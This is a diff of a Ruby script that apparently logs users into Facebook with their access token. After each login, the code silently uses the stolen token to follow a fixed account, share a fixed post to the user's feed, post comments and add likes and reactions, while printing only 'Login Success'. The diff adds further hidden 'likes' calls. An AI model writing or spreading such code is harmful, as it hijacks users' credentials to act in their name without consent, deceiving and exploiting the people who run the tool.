@@ -197,7 +197,7 @@ def loginpw()
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hello sir","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LIKE","LOVE","WOW"].sample,"access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
     puts ("#{$g}[✓] Login Success#{$a}")
     sleep(0.5)
     Masuk()
@@ -227,7 +227,8 @@ def loginto()
     fopen.close()
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"].sample,"access_token"=>$token})  
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"].sample,"access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token}) 
     $name = req['name']
     $id = req['id']
     puts ("#{$g}[✓] Login Success!#{$a}")
@@ -274,6 +275,7 @@ def loginco()
     else
       $name = b['name']
       $id = b['id']
+      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
       Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
       Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
       Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁"].sample,"access_token"=>$token})  
